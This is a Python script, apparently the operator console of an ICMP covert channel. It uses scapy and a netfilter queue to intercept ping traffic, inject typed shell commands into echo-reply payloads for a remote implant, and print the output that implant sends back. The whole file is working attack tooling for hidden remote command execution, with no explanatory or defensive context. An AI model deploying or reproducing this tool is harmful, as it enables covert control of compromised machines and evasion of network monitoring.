#import socket
#import struct
from Trudy.logger import Logger
from Trudy.trudy import Trudy

from threading import Thread, Lock

import scapy.all as scapy

logger = Logger()

cmd = ""

def process_packet(packet):
    global cmd
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.ICMP) and (scapy_packet.type == 0):
        scapy_packet.load = cmd.encode()
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        packet.set_payload(bytes(scapy_packet))
    
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.ICMP) and (scapy_packet.type == 8):
        query = scapy_packet.load.decode().split(": ", 1)
        if (len(query) == 2):
            if query[0] == "EXPECT CMD":
                if cmd == "":
                    cmd = input("$ ")
                else:
                    packet.drop()
                    return
            else:
                print(query[1], end="", flush=True)
                cmd = ""
    packet.accept()

if __name__ == "__main__":
    trudy = Trudy(logger=logger)

    trudy.enforce_sudo()

    try:
        trudy.enable_packet_forwarding()
        trudy.enable_netfilter_queue(process_packet)
    finally:
        trudy.reset_firewall()
        trudy.disable_packet_forwarding()
